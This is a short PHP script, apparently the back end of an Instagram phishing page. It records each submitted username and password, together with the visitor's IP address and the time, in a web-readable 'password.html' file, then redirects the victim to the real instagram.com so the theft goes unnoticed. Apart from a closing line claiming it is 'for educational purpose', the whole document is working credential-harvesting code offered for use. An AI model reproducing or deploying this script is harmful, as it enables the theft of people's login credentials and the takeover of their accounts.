<?php
error_reporting(0);
 
$kull = $_POST['username'];
$sifre = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$tarih = date("Y-m-d;h:i:s");
 
 
 
if( (empty($kull)) or (empty($sifre)) ){
     header('location: index.html');
}else{
$f = fopen("password.html", "a");
	fwrite($f,
		'Username: [<b><font color="#660000">'.$kull.'</font></b>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.
		'Password: [<b><font color="#9900FF">'.$sifre.'</font></b>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.
		'IP: [<b><font color="#996600">'.$ip.'</font></b>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.
		'Date: [<b><font color="#FF6633">'.$tarih.'</font></b>]<br> ');

	fclose($f);
header("Location: https://instagram.com/");
}
?>
 
 
 
//created by Erdi ÖZER for educational purpose
